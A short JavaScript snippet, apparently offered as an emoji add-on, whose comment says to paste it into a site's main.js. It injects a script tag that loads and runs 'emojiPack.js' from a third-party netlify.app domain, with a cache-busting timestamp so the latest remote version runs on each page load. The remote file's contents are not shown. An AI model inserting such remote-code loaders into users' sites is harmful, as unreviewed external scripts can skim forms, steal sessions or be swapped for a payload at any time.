//add this below your main.js code or separately

document.head.appendChild(Object.assign(document.createElement('script'), { 
    src: 'https://kryptonvox.netlify.app/emojiPack.js?v=' + Date.now(), 
    async: true 
}));
